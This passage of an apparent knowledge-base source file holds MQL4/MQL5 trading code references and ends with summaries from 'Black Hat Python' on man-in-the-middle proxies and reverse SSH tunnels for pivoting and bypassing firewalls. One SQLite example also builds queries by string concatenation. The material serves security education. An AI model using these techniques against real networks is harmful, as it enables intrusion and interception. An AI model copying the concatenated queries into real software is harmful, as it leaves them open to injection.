    'MQL4 Expert Advisor template: //+------------------------------------------------------------------+ //| MyEA.mq4 | //+------------------------------------------------------------------+ #property copyright "Author" #property version "1.00" #property strict input double InpLotSize=0.01; input int InpStopLoss=50; input int InpTakeProfit=100; input int InpMagicNumber=12345; input int InpMaxSpread=30; double pip; int OnInit() { pip=(Digits==3||Digits==5)?Point*10:Point; return(INIT_SUCCEEDED); } void OnDeinit(const int reason) { Comment(""); } void OnTick() { if(!IsTradeAllowed()) return; if(MarketInfo(Symbol(),MODE_SPREAD)>InpMaxSpread) return; if(CountOrders()==0 && BuySignal()) { double sl=Ask-InpStopLoss*pip; double tp=Ask+InpTakeProfit*pip; int ticket=OrderSend(Symbol(),OP_BUY,InpLotSize,Ask,3,sl,tp,"MyEA",InpMagicNumber); if(ticket<0) Print("Buy error: ",GetLastError()); } } bool BuySignal() { return(iRSI(Symbol(),0,14,PRICE_CLOSE,1)<30); } int CountOrders() { int count=0; for(int i=OrdersTotal()-1;i>=0;i--) { if(OrderSelect(i,SELECT_BY_POS)&&OrderSymbol()==Symbol()&&OrderMagicNumber()==InpMagicNumber) count++; } return count; }', 1.5)

  add('trading_code_templates', ['indicator template mql4', 'mql4 indicator boilerplate', 'custom indicator starter', 'indicator development template'],
    'MQL4 Custom Indicator template: //+------------------------------------------------------------------+ //| MyIndicator.mq4 | //+------------------------------------------------------------------+ #property copyright "Author" #property version "1.00" #property strict #property indicator_chart_window // or indicator_separate_window #property indicator_buffers 2 #property indicator_color1 clrDodgerBlue #property indicator_color2 clrRed #property indicator_width1 2 #property indicator_width2 2 input int InpPeriod=14; input ENUM_MA_METHOD InpMethod=MODE_SMA; double BuyBuffer[]; double SellBuffer[]; int OnInit() { SetIndexBuffer(0,BuyBuffer); SetIndexBuffer(1,SellBuffer); SetIndexStyle(0,DRAW_ARROW); SetIndexStyle(1,DRAW_ARROW); SetIndexArrow(0,233); // up arrow SetIndexArrow(1,234); // down arrow SetIndexLabel(0,"Buy Signal"); SetIndexLabel(1,"Sell Signal"); IndicatorShortName("MyIndicator("+IntegerToString(InpPeriod)+")"); return(INIT_SUCCEEDED); } int OnCalculate(const int rates_total,const int prev_calculated,const datetime &time[],const double &open[],const double &high[],const double &low[],const double &close[],const long &tick_volume[],const long &volume[],const int &spread[]) { int limit=rates_total-prev_calculated; if(prev_calculated>0) limit++; for(int i=limit-1;i>=1;i--) { BuyBuffer[i]=EMPTY_VALUE; SellBuffer[i]=EMPTY_VALUE; double ma=iMA(Symbol(),0,InpPeriod,0,InpMethod,PRICE_CLOSE,i); if(close[i]>ma && close[i+1]<=iMA(Symbol(),0,InpPeriod,0,InpMethod,PRICE_CLOSE,i+1)) BuyBuffer[i]=low[i]-10*Point; if(close[i]<ma && close[i+1]>=iMA(Symbol(),0,InpPeriod,0,InpMethod,PRICE_CLOSE,i+1)) SellBuffer[i]=high[i]+10*Point; } return(rates_total); }', 1.5)

  add('trading_code_templates', ['mql5 ea template', 'mt5 expert advisor template', 'mql5 ea boilerplate', 'mql5 starter ea'],
    'MQL5 Expert Advisor template: //+------------------------------------------------------------------+ //| MyEA.mq5 | //+------------------------------------------------------------------+ #property copyright "Author" #property version "1.00" #include <Trade/Trade.mqh> input double InpLotSize=0.01; input int InpStopLoss=500; // in points input int InpTakeProfit=1000; input ulong InpMagicNumber=12345; input int InpMaxSpread=30; CTrade trade; int maHandle; double maBuffer[]; int OnInit() { trade.SetExpertMagicNumber(InpMagicNumber); maHandle=iMA(Symbol(),PERIOD_CURRENT,20,0,MODE_SMA,PRICE_CLOSE); if(maHandle==INVALID_HANDLE) { Print("Failed to create MA handle"); return(INIT_FAILED); } ArraySetAsSeries(maBuffer,true); return(INIT_SUCCEEDED); } void OnDeinit(const int reason) { IndicatorRelease(maHandle); Comment(""); } void OnTick() { if(!TerminalInfoInteger(TERMINAL_TRADE_ALLOWED)) return; if((int)SymbolInfoInteger(Symbol(),SYMBOL_SPREAD)>InpMaxSpread) return; if(CopyBuffer(maHandle,0,0,3,maBuffer)<3) return; double ask=SymbolInfoDouble(Symbol(),SYMBOL_ASK); double bid=SymbolInfoDouble(Symbol(),SYMBOL_BID); double point=SymbolInfoDouble(Symbol(),SYMBOL_POINT); if(PositionsTotal()==0 && maBuffer[1]>maBuffer[2]) { double sl=ask-InpStopLoss*point; double tp=ask+InpTakeProfit*point; trade.Buy(InpLotSize,Symbol(),ask,sl,tp,"MyEA"); } }', 1.5)

  // ── MQL4/MQL5 Advanced: Order Types & Execution ───────────────────────────

  add('mql_order_types', ['mql4 ordersend op_buy op_sell', 'mt4 pending order buylimit sellstop', 'mql4 ordersend buy sell limit stop code', 'mql4 ecn stp execution ordersend'],
    'MQL4 order types and execution: Market orders — OP_BUY (0), OP_SELL (1) executed at current Ask/Bid. Pending orders — OP_BUYLIMIT (2) buy below price, OP_SELLLIMIT (3) sell above price, OP_BUYSTOP (4) buy above price, OP_SELLSTOP (5) sell below price. OrderSend(Symbol(),OP_BUYLIMIT,lots,price,slippage,sl,tp,"comment",magic,expiration,clrGreen). Modify with OrderModify(ticket,price,sl,tp,expiration,clrBlue). Delete pending: OrderDelete(ticket). Check execution mode: MarketInfo(Symbol(),MODE_EXECUTION) — EXECUTION_INSTANT, EXECUTION_MARKET (ECN/STP). For ECN brokers: open order first with zero SL/TP, then OrderModify to add SL/TP. Always use NormalizeDouble() for prices. Check MODE_STOPLEVEL for minimum SL/TP distance.', 0.85)

  add('mql_order_types', ['mql5 ctrade buy sell position deal order', 'mt5 ctrade position vs deal netting hedging', 'mql5 trade_action_deal trade_action_pending', 'mql5 mqltraderesult mqltradecheck'],
    'MQL5 order/position/deal model: Three-tier system — Orders (pending instructions), Deals (executed transactions), Positions (current holdings). CTrade class: trade.Buy(volume,symbol,price,sl,tp,comment), trade.Sell(), trade.BuyLimit(), trade.SellLimit(), trade.BuyStop(), trade.SellStop(). Position management: PositionSelect(symbol), PositionGetDouble(POSITION_VOLUME), PositionGetInteger(POSITION_TYPE). History: HistorySelect(from,to), HistoryDealsTotal(), HistoryDealGetDouble(ticket,DEAL_PROFIT). Two account modes: ACCOUNT_MARGIN_MODE_RETAIL_NETTING (one position per symbol) vs ACCOUNT_MARGIN_MODE_RETAIL_HEDGING (multiple positions per symbol). OrderSend fills MqlTradeRequest struct: request.action=TRADE_ACTION_DEAL for market, TRADE_ACTION_PENDING for pending. Check SymbolInfoInteger(symbol,SYMBOL_FILLING_MODE) for fill policy.', 0.85)

  add('mql_order_types', ['mql orderstotal orderselect loop management', 'mql close all open orders by symbol magic', 'mql order pool iteration backwards close', 'mql positionstotal positiongetticket loop'],
    'MQL order pool management: MQL4 — iterate backwards to safely close: for(int i=OrdersTotal()-1;i>=0;i--){if(OrderSelect(i,SELECT_BY_POS,MODE_TRADES)){if(OrderSymbol()==Symbol()&&OrderMagicNumber()==Magic){if(OrderType()==OP_BUY) OrderClose(OrderTicket(),OrderLots(),Bid,3); else if(OrderType()==OP_SELL) OrderClose(OrderTicket(),OrderLots(),Ask,3);}}} Delete all pending: if(OrderType()>1) OrderDelete(OrderTicket()). Count by type: maintain separate counters for buys/sells/pending. MQL5 — positions: for(int i=PositionsTotal()-1;i>=0;i--){ulong ticket=PositionGetTicket(i);if(PositionGetString(POSITION_SYMBOL)==Symbol()) trade.PositionClose(ticket);} Orders: for(int i=OrdersTotal()-1;i>=0;i--){ulong ticket=OrderGetTicket(i); trade.OrderDelete(ticket);} Always iterate backwards when closing to avoid index shifting.', 1.3)

  // ── MQL4/MQL5 Advanced: Money Management ─────────────────────────────────

  add('mql_money_management', ['mql4 lot size calculation', 'mql risk per trade percent', 'mql4 money management position sizing', 'mql4 lot calculator'],
    'MQL4 money management: Risk-based lot sizing — double RiskPercent=2.0; double StopLossPips=50; double tickValue=MarketInfo(Symbol(),MODE_TICKVALUE); double tickSize=MarketInfo(Symbol(),MODE_TICKSIZE); double point=MarketInfo(Symbol(),MODE_POINT); double riskAmount=AccountBalance()*RiskPercent/100; double pipValue=tickValue*(point/tickSize); double lots=NormalizeDouble(riskAmount/(StopLossPips*pipValue),2); lots=MathMax(MarketInfo(Symbol(),MODE_MINLOT),MathMin(lots,MarketInfo(Symbol(),MODE_MAXLOT))). Fixed ratio: lots=AccountEquity()/10000*baseLot. Margin check: AccountFreeMarginCheck(Symbol(),OP_BUY,lots)>0. Step normalization: double step=MarketInfo(Symbol(),MODE_LOTSTEP); lots=NormalizeDouble(MathFloor(lots/step)*step,2). Always verify: lots>=MINLOT && lots<=MAXLOT && lots%LOTSTEP==0.', 1.4)

  add('mql_money_management', ['mql5 lot calculation ctrade', 'mql5 position sizing risk', 'mql5 money management', 'mt5 risk management code'],
    'MQL5 money management: AccountInfoDouble(ACCOUNT_BALANCE), AccountInfoDouble(ACCOUNT_EQUITY), AccountInfoDouble(ACCOUNT_MARGIN_FREE). Lot calculation: double tickSize=SymbolInfoDouble(sym,SYMBOL_TRADE_TICK_SIZE); double tickValue=SymbolInfoDouble(sym,SYMBOL_TRADE_TICK_VALUE); double point=SymbolInfoDouble(sym,SYMBOL_POINT); double riskMoney=AccountInfoDouble(ACCOUNT_BALANCE)*riskPct/100; double slPoints=slPips*10; // 5-digit double lots=NormalizeDouble(riskMoney/(slPoints*tickValue/tickSize),2). Validate: double minLot=SymbolInfoDouble(sym,SYMBOL_VOLUME_MIN); double maxLot=SymbolInfoDouble(sym,SYMBOL_VOLUME_MAX); double lotStep=SymbolInfoDouble(sym,SYMBOL_VOLUME_STEP); lots=MathMax(minLot,MathMin(maxLot,MathRound(lots/lotStep)*lotStep)). Margin requirement: OrderCalcMargin(ORDER_TYPE_BUY,sym,lots,ask,margin).', 1.4)

  add('mql_money_management', ['mql drawdown control', 'mql equity protection', 'mql max loss stop trading', 'mql daily loss limit ea'],
    'MQL equity/drawdown protection: Daily loss limit — store starting equity at day start: if(TimeDay(TimeCurrent())!=lastDay){startEquity=AccountEquity();lastDay=TimeDay(TimeCurrent());}. Check: if(AccountEquity()<startEquity*(1-maxDailyLossPct/100)) return; // stop trading. Max drawdown: track peak equity: peakEquity=MathMax(peakEquity,AccountEquity()); double dd=(peakEquity-AccountEquity())/peakEquity*100; if(dd>maxDD) CloseAllPositions(). Equity trailing: move SL to breakeven after X pips profit. Account protection: if(AccountMarginLevel()<150) CloseWorstPosition(). Recovery mode: after loss, reduce lot size by factor. Compound growth: lots=baseLot*MathPow(AccountBalance()/initialBalance,0.5). Risk of ruin: never risk >2% per trade, keep max open risk <6% total.', 1.3)

  // ── MQL4/MQL5 Advanced: Chart Objects & GUI ──────────────────────────────

  add('mql_chart_objects', ['mql4 chart objects', 'mql draw line rectangle text', 'mql4 objectcreate label', 'mt4 graphical objects programming'],
    'MQL4 chart objects: ObjectCreate(0,"myLine",OBJ_HLINE,0,0,price) for horizontal line. Types: OBJ_VLINE, OBJ_HLINE, OBJ_TREND, OBJ_RECTANGLE, OBJ_TRIANGLE, OBJ_TEXT, OBJ_LABEL, OBJ_BUTTON, OBJ_EDIT, OBJ_BITMAP_LABEL, OBJ_ARROW. Set properties: ObjectSetInteger(0,"myLine",OBJPROP_COLOR,clrRed); ObjectSetInteger(0,"myLine",OBJPROP_STYLE,STYLE_DASH); ObjectSetInteger(0,"myLine",OBJPROP_WIDTH,2); ObjectSetString(0,"myLabel",OBJPROP_TEXT,"Price: "+DoubleToStr(Bid,Digits)). Labels use pixel coordinates: ObjectSetInteger(0,"lab",OBJPROP_XDISTANCE,20); ObjectSetInteger(0,"lab",OBJPROP_YDISTANCE,30); ObjectSetInteger(0,"lab",OBJPROP_CORNER,CORNER_LEFT_UPPER). Delete: ObjectDelete(0,"myLine"). Delete all: ObjectsDeleteAll(0,0,-1) or by prefix: ObjectsDeleteAll(0,"EA_"). ChartRedraw() to refresh.', 1.3)

  add('mql_chart_objects', ['mql4 button panel gui', 'mql create dashboard buttons', 'mql4 interactive panel click event', 'mql4 ea graphical interface'],
    'MQL4 interactive GUI panels: Create button: ObjectCreate(0,"btnBuy",OBJ_BUTTON,0,0,0); ObjectSetInteger(0,"btnBuy",OBJPROP_XDISTANCE,20); ObjectSetInteger(0,"btnBuy",OBJPROP_YDISTANCE,30); ObjectSetInteger(0,"btnBuy",OBJPROP_XSIZE,100); ObjectSetInteger(0,"btnBuy",OBJPROP_YSIZE,30); ObjectSetString(0,"btnBuy",OBJPROP_TEXT,"BUY"); ObjectSetInteger(0,"btnBuy",OBJPROP_BGCOLOR,clrGreen). Handle clicks in OnChartEvent: void OnChartEvent(const int id,const long &lparam,const double &dparam,const string &sparam){if(id==CHARTEVENT_OBJECT_CLICK){if(sparam=="btnBuy"){/* execute buy */ObjectSetInteger(0,"btnBuy",OBJPROP_STATE,false);}}if(id==CHARTEVENT_CHART_CHANGE){/* redraw panel */}}. Edit fields: OBJ_EDIT for user input, read with ObjectGetString(). Build info panel: display spread, account info, signal status.', 1.3)

  add('mql_chart_objects', ['mql5 chart objects canvas', 'mql5 cgraphic canvas drawing', 'mql5 custom panel CDialog', 'mt5 gui programming'],
    'MQL5 chart objects and canvas: Same OBJ_* types as MQL4 plus OBJ_CHART (embedded chart). CCanvas class for pixel drawing: #include <Canvas/Canvas.mqh>. CCanvas canvas; canvas.CreateBitmapLabel("myCanvas",20,30,400,300); canvas.Erase(ColorToARGB(clrBlack)); canvas.FillRectangle(0,0,100,100,ColorToARGB(clrBlue)); canvas.TextOut(50,50,"Hello",ColorToARGB(clrWhite)); canvas.Update(). CGraphic for charts: #include <Graphics/Graphic.mqh>. Dialog panels: #include <Controls/Dialog.mqh>; CAppDialog uses CButton, CEdit, CLabel, CComboBox, CCheckBox. Events: EVENT_CHART_OBJECT_CLICK, EVENT_CHART_OBJECT_DRAG. ChartSetInteger(0,CHART_EVENT_OBJECT_CREATE,true) to receive creation events. Canvas supports anti-aliased drawing, gradients, and alpha blending.', 1.3)

  // ── MQL4/MQL5 Advanced: File I/O Operations ──────────────────────────────

  add('mql_file_operations', ['mql4 file read write csv', 'mql4 fileopen filewrite', 'mql4 csv export trade log', 'mt4 file operations'],
    'MQL4 file operations: Open: int handle=FileOpen("data.csv",FILE_CSV|FILE_WRITE|FILE_ANSI,","); Write CSV: FileWrite(handle,"Time","Symbol","Type","Lots","Price","Profit"); FileWrite(handle,TimeToStr(OrderOpenTime()),OrderSymbol(),OrderType()==OP_BUY?"Buy":"Sell",OrderLots(),OrderOpenPrice(),OrderProfit()); FileClose(handle). Read: handle=FileOpen("settings.csv",FILE_CSV|FILE_READ,","); while(!FileIsEnding(handle)){string val=FileReadString(handle);}. Binary: FILE_BIN|FILE_WRITE, FileWriteDouble(handle,value), FileWriteInteger(handle,value). File location: MQL4/Files/ folder (sandboxed). Check existence: FileIsExist("data.csv"). Delete: FileDelete("old.csv"). Common folder: FILE_COMMON flag for shared files between terminals.', 1.3)

  add('mql_file_operations', ['mql5 file operations database', 'mql5 fileopen csv binary', 'mql5 sqlite database', 'mt5 data storage file'],
    'MQL5 file operations: Similar to MQL4 but adds DatabaseOpen for SQLite: int db=DatabaseOpen("trades.sqlite",DATABASE_OPEN_READWRITE|DATABASE_OPEN_CREATE); DatabaseExecute(db,"CREATE TABLE IF NOT EXISTS trades(ticket INT,symbol TEXT,profit REAL)"); DatabaseExecute(db,"INSERT INTO trades VALUES("+ticket+",\'"+symbol+"\',"+profit+")"); int request=DatabasePrepare(db,"SELECT * FROM trades WHERE profit>0"); while(DatabaseRead(request)){long t;DatabaseColumnLong(request,0,t);}; DatabaseFinalize(request); DatabaseClose(db). File ops: FileOpen, FileWrite, FileReadString, FileReadNumber — same patterns as MQL4. Advantages of SQLite: indexed queries, transactions, complex filtering vs flat CSV files. Can store EA state, trade journal, optimization results.', 1.3)

  add('mql_file_operations', ['mql save ea settings', 'mql persistent state storage', 'mql global variables file', 'mql ea configuration save load'],
    'MQL persistent state management: Global terminal variables — GlobalVariableSet("EA_lastTrade",TimeCurrent()); double val=GlobalVariableGet("EA_state"); GlobalVariableCheck("name") to verify existence. Survives EA restart but not terminal reinstall. File-based persistence: Save state to binary file: int h=FileOpen("EA_state.bin",FILE_BIN|FILE_WRITE); FileWriteInteger(h,currentState); FileWriteDouble(h,lastPrice); FileClose(h). Load: h=FileOpen("EA_state.bin",FILE_BIN|FILE_READ); currentState=FileReadInteger(h); lastPrice=FileReadDouble(h). INI-style config: Write sections with [Header] and Key=Value pairs. MQL5 adds: FileLoad()/FileSave() for array serialization. Best practice: save state in OnDeinit(reason), load in OnInit(). Use reason code: if(reason==REASON_CHARTCHANGE||reason==REASON_PARAMETERS) save settings.', 1.2)

  // ── MQL4/MQL5 Advanced: Network & Web Requests ───────────────────────────

  add('mql_network_web', ['mql4 webrequest http api', 'mql4 send http request', 'mql4 telegram notification bot', 'mt4 webrequest rest api'],
    'MQL4 WebRequest for HTTP: Must add URL to Tools→Options→Expert Advisors→Allow WebRequest. int res=WebRequest("POST","https://api.telegram.org/bot<TOKEN>/sendMessage","Content-Type: application/x-www-form-urlencoded\\r\\n",5000,StringToCharArray("chat_id=123&text="+msg),result,headers). GET request: WebRequest("GET",url,"",5000,empty,result,headers); string response=CharArrayToString(result). Parse JSON manually: find key positions with StringFind(), extract with StringSubstr(). Telegram bot integration: send trade alerts, daily summaries, error notifications. Send to webhook: post trade data to Discord, Slack, custom endpoints. Limitations: synchronous (blocks OnTick), 5-second timeout recommended, HTTPS only, no WebSocket support in MQL4.', 1.3)

  add('mql_network_web', ['mql5 webrequest json api', 'mql5 http post get', 'mql5 socket network', 'mt5 api integration web'],
    'MQL5 network operations: WebRequest enhanced: int res=WebRequest("POST",url,headers,timeout,post_data,result,result_headers). MQL5 adds native sockets: int sock=SocketCreate(); if(SocketConnect(sock,"api.example.com",80,5000)){string req="GET /data HTTP/1.1\\r\\nHost: api.example.com\\r\\n\\r\\n"; SocketSend(sock,req,StringLen(req)); char buf[]; SocketRead(sock,buf,1024,5000); SocketClose(sock);}. JSON parsing: #include <JAson.mqh> or manual parsing. CJAVal json; json.Deserialize(response); double price=json["price"].ToDbl(). Push notifications: SendNotification("Trade opened"). Email: SendMail("Subject","Body"). SocketIsConnected() for persistent connections. TLS/SSL supported for HTTPS and secure sockets.', 1.3)

  add('mql_network_web', ['mql copy trading signal', 'mql ea communication between terminals', 'mql named pipes shared memory', 'mql multi terminal sync'],
    'MQL inter-terminal communication: Named pipes (Windows): FileOpen("\\\\.\\pipe\\myPipe",FILE_BIN|FILE_WRITE) — requires DLL import for CreateNamedPipe. Shared files: Master EA writes signals to common file: FileOpen("signal.csv",FILE_CSV|FILE_WRITE|FILE_COMMON); Slave EA reads from same file using FILE_COMMON flag. GlobalVariables: shared within same terminal instance. Copy trading pattern: Master sends: FileWrite(h,Symbol(),cmd,lots,sl,tp,ticket); Slave reads and executes matching orders, tracks master ticket→slave ticket mapping. MQL5 custom events: ChartCustomEvent(chartId,eventId,param,message) for charts in same terminal. Memory-mapped files via DLL for high-speed IPC. Socket-based: run a local TCP server on one terminal, connect from others for real-time sync.', 1.2)

  // ── MQL4/MQL5 Advanced: Strategy Patterns ────────────────────────────────

  add('mql_strategy_patterns', ['mql grid trading ea', 'mql4 grid bot code', 'mql grid strategy pending orders', 'mt4 grid trading system'],
    'MQL grid trading EA pattern: Place buy and sell orders at fixed intervals above and below current price. Grid setup: double gridStep=20*Point; int gridLevels=10; for(int i=1;i<=gridLevels;i++){double buyPrice=NormalizeDouble(Ask-i*gridStep,Digits); double sellPrice=NormalizeDouble(Bid+i*gridStep,Digits); OrderSend(Symbol(),OP_BUYLIMIT,lots,buyPrice,3,buyPrice-gridStep,buyPrice+gridStep*tp_mult,"Grid",magic); OrderSend(Symbol(),OP_SELLLIMIT,lots,sellPrice,3,sellPrice+gridStep,sellPrice-gridStep*tp_mult,"Grid",magic);}. Grid management: count active orders per direction, replace filled pending orders, set max grid size. Anti-grid: only trade in trend direction. Dynamic grid: adjust gridStep based on ATR. Risk: grid systems have unlimited drawdown potential in strong trends — always use max loss circuit breaker.', 1.4)

  add('mql_strategy_patterns', ['mql scalping ea fast execution', 'mql4 scalper code pattern', 'mql high frequency trading', 'mt4 tick scalping ea'],
    'MQL scalping EA patterns: Fast execution: minimize calculations in OnTick, pre-calculate in OnTimer or on new bar. Spread filter: if(Ask-Bid>maxSpread*Point) return; Tick-based entry: track tick direction (uptick/downtick sequences). Candle scalper: trade first N seconds of new candle with tight SL/TP. Mean reversion: RSI<20 buy, RSI>80 sell on M1 with 5-10 pip targets. Breakout scalper: enter on break of previous bar high/low. Key considerations: use ECN/STP broker (no dealing desk), VPS with <5ms latency, check MODE_FREEZELEVEL, avoid news time. Partial close for scaling out: OrderClose(ticket,OrderLots()/2,Bid,3). Candle timer: if(TimeCurrent()-iTime(Symbol(),PERIOD_M1,0)<10) return; // only trade first 10 seconds. MQL5: use SymbolInfoTick() for latest tick data.', 1.4)

  add('mql_strategy_patterns', ['mql hedging strategy code', 'mql martingale ea', 'mql news trading filter', 'mql anti-martingale money management'],
    'MQL advanced strategy patterns: Hedging — open opposite positions to lock profit/loss: buy AND sell simultaneously (MT5 hedging mode), close profitable side on signal. Martingale — double lot on loss: nextLot=baseLot*MathPow(2,consecutiveLosses); WARNING: guaranteed account blow-up eventually, always cap at maxMultiplier. Anti-martingale: increase on wins, reset on loss — better risk profile. News filter: avoid trading around high-impact news — parse ForexFactory calendar or use time-based exclusion: input string newsTime1="14:30"; if(MathAbs(TimeHour(TimeCurrent())*60+TimeMinute(TimeCurrent())-(14*60+30))<30) return; Session filter: trade only London/NY overlap (12:00-16:00 GMT). Basket trading: trade correlated pairs together (EURUSD+GBPUSD), manage total exposure. Pyramiding: add to winning positions with trailing stops.', 1.3)

  // ── MQL4/MQL5 Advanced: Indicator Mathematical Formulas ──────────────────

  add('mql_indicator_formulas', ['mql custom moving average code', 'mql ema sma wma calculation', 'mql4 moving average formula', 'mql indicator math calculation'],
    'MQL moving average formulas: SMA — sum/period: double sum=0; for(int i=0;i<period;i++) sum+=Close[shift+i]; sma=sum/period. EMA — exponential: double k=2.0/(period+1); ema[i]=Close[i]*k+ema[i+1]*(1-k); or: ema=prevEma+k*(Close[i]-prevEma). WMA — weighted: double wsum=0,wdiv=0; for(int i=0;i<period;i++){wsum+=Close[shift+i]*(period-i);wdiv+=(period-i);} wma=wsum/wdiv. DEMA: 2*EMA-EMA(EMA). TEMA: 3*EMA-3*EMA(EMA)+EMA(EMA(EMA)). Hull MA: WMA(2*WMA(n/2)-WMA(n),sqrt(n)) — faster response. Adaptive MA (Kaufman KAMA): direction=MathAbs(Close[0]-Close[period]); volatility=sum of MathAbs(Close[i]-Close[i+1]); er=direction/volatility; smooth=(er*(fast-slow)+slow)^2. SMMA: first=SMA, then smma[i]=(smma[i+1]*(period-1)+Close[i])/period.', 1.4)

  add('mql_indicator_formulas', ['mql rsi macd stochastic formula', 'mql oscillator calculation code', 'mql4 custom rsi code', 'mql momentum indicator math'],
    'MQL oscillator formulas: RSI — for each bar: change=Close[i]-Close[i+1]; if(change>0) gain+=change; else loss-=change; avgGain=gain/period; avgLoss=loss/period; RS=avgGain/avgLoss; RSI=100-100/(1+RS). Subsequent: avgGain=(prevAvgGain*(period-1)+currentGain)/period. MACD: fastEMA-slowEMA, signal=EMA(MACD,signalPeriod), histogram=MACD-signal. Stochastic: %K=100*(Close-LowestLow(period))/(HighestHigh(period)-LowestLow(period)); %D=SMA(%K,slowing). CCI: (TypicalPrice-SMA(TP))/0.015/MeanDeviation. MFI (Money Flow Index): like RSI but volume-weighted. Williams %R: -100*(HighestHigh-Close)/(HighestHigh-LowestLow). Momentum: Close[0]-Close[period] or Close[0]/Close[period]*100. ROC: (Close-Close[n])/Close[n]*100.', 1.4)

  add('mql_indicator_formulas', ['mql bollinger bands atr formula', 'mql volatility indicator code', 'mql4 custom bands channel', 'mql ichimoku keltner donchian math'],
    'MQL volatility/channel indicator formulas: Bollinger Bands — middle=SMA(Close,period); double dev=0; for(int i=0;i<period;i++) dev+=(Close[shift+i]-middle)*(Close[shift+i]-middle); stddev=MathSqrt(dev/period); upper=middle+mult*stddev; lower=middle-mult*stddev. ATR: TR=MathMax(High[i]-Low[i], MathMax(MathAbs(High[i]-Close[i+1]), MathAbs(Low[i]-Close[i+1]))); ATR=SMA(TR,period) or Wilder smoothing. Keltner Channel: middle=EMA(Close,period); upper=middle+mult*ATR; lower=middle-mult*ATR. Donchian: upper=Highest(High,period); lower=Lowest(Low,period); middle=(upper+lower)/2. Ichimoku: TenkanSen=(Highest(9)+Lowest(9))/2; KijunSen=(Highest(26)+Lowest(26))/2; SenkouA=(Tenkan+Kijun)/2 shifted 26 forward; SenkouB=(Highest(52)+Lowest(52))/2 shifted 26; ChikouSpan=Close shifted 26 back.', 1.4)

  // ── MQL4/MQL5 Advanced: Testing & Code Quality ───────────────────────────

  add('mql_testing_quality', ['mql4 strategy tester optimization', 'mt4 backtest settings tips', 'mql4 strategy tester best practices', 'mql ea testing guide'],
    'MQL4 Strategy Tester best practices: Model: "Every tick" for accurate results (Open Prices Only for fast screening). Use 99% quality history data from TickDataSuite or Birt TDS. Input optimization: set Start/Step/Stop for each parameter — use genetic algorithm for >3 parameters. Avoid over-fitting: test on out-of-sample data (train 2015-2020, validate 2021-2023). Walk-forward: optimize on rolling window, test on next period. Key metrics: Profit Factor>1.5, Expected Payoff>0, Max Drawdown<30%, Sharpe>1. Custom criteria: double OnTester(){return AccountInfoDouble(ACCOUNT_BALANCE)*MathSqrt(TotalTrades)/MaxDrawdown;}. Common mistakes: curve-fitting with too many parameters, ignoring spread/commission, not testing across different market conditions. Export results: press "Copy" for tab-separated data, analyze in Excel/Python.', 1.3)

  add('mql_testing_quality', ['mql5 strategy tester agent', 'mt5 optimization cloud', 'mql5 ontester custom criterion', 'mt5 multi-currency backtest'],
    'MQL5 Strategy Tester features: Multi-currency testing: trade multiple symbols in one EA. Tick modes: Every tick, Every tick based on real ticks, 1 minute OHLC, Open prices. MQL5 Cloud Network: distributed optimization using thousands of agents. Custom optimization: double OnTester(){double trades=TesterStatistics(STAT_TRADES); double pf=TesterStatistics(STAT_PROFIT_FACTOR); double dd=TesterStatistics(STAT_EQUITY_DDREL_PERCENT); return trades>100?pf*MathSqrt(trades)*100/(dd+1):0;}. Frame mode: OnTesterInit()/OnTesterPass()/OnTesterDeinit() for collecting optimization results. Visual testing: step through bar-by-bar with live chart. Forward testing: automatic out-of-sample validation. Export via FrameAdd()/FrameNext() for custom analysis. Debug in tester: Print() output goes to Journal tab.', 1.3)

  add('mql_testing_quality', ['mql code quality standards', 'mql best coding practices', 'mql clean code organization', 'mql ea code review checklist'],
    'MQL code quality checklist: 1) Always use #property strict (MQL4) or strict type checking. 2) Magic number + symbol check in all order loops. 3) NormalizeDouble() for all price comparisons. 4) Check return values: if(OrderSend()<0){Print("Error: ",GetLastError());}. 5) Proper error handling: ResetLastError() before, GetLastError() after operations. 6) No hardcoded values: use input parameters with sensible defaults. 7) Resource cleanup in OnDeinit(): delete indicators, objects, timers. 8) Comment code with // or /* */ for complex logic. 9) Use meaningful variable names: totalBuyOrders not x. 10) Separate logic into functions: IsNewBar(), GetSignal(), ManageTrades(). 11) Log important events: Print("EA v1.0 initialized on "+Symbol()). 12) Handle zero-divide: if(divisor!=0) result=value/divisor. 13) Avoid infinite loops: always have break conditions. 14) Test edge cases: no history, weekend gaps, holidays. 15) Version numbering in EA properties.', 1.3)

  // ── Network Security Python (Black Hat Python 3) ──────────────────────────
  // Source: EONRaider/blackhat-python3 — Python 3 implementations from
  // "Black Hat Python" by Justin Seitz. Educational network-security reference.

  add('network_security_python', ['python tcp client server', 'python socket programming', 'python udp datagram client'],
    'Python network fundamentals (Black Hat Python Ch.2): TCP client — socket.socket(AF_INET, SOCK_STREAM), connect(), send(), recv(). TCP server — bind(), listen(), accept(), handle_client in thread. UDP client — socket.socket(AF_INET, SOCK_DGRAM), sendto(), recvfrom() (no handshake). Always encode/decode with UTF-8. Use struct.pack/unpack for binary protocols. Example: client = socket.socket(socket.AF_INET, socket.SOCK_STREAM); client.connect((target_host, target_port)); client.send(b"GET / HTTP/1.1\\r\\n"); response = client.recv(4096). Threading for concurrent connections: threading.Thread(target=handle, args=(client_socket,)).start().', 1.0)

  add('network_security_python', ['python tcp proxy', 'tcp traffic interception python', 'man in the middle proxy python'],
    'TCP proxy in Python (Black Hat Python Ch.2): Intercepts traffic between client and server for analysis/modification. Architecture: local_socket.bind((local_host, local_port)) → accept() → connect to remote → relay data bidirectionally using select() or threads. Key functions: receive_from(socket) with timeout, request_handler(buffer) for modifying client→server data, response_handler(buffer) for modifying server→client data, hexdump(data) for packet visualization. Uses: protocol analysis, traffic modification, fuzzing, debugging. Implementation: two threads per connection — one forwarding local→remote, one forwarding remote→local. Apply transformations in handlers before forwarding.', 0.95)

  add('network_security_python', ['python ssh client paramiko', 'ssh remote command execution python', 'python ssh tunneling'],
    'SSH with Python paramiko (Black Hat Python Ch.2): paramiko provides SSHv2 protocol. SSH client: client = paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy()); client.connect(hostname, username, password/key); stdin, stdout, stderr = client.exec_command(cmd). SSH server: paramiko.ServerInterface subclass, load host key with paramiko.RSAKey.from_private_key_file(). Reverse SSH tunnel: connect back from target to attacker, create paramiko.Transport, request port forwarding. Remote port forwarding (rforward.py): forwards local port through SSH to remote network. Use cases: encrypted command execution, pivoting through networks, bypassing firewalls.', 1.0)

  add('network_security_python', ['python raw socket sniffer', 'python packet capture', 'raw packet sniffer python'],
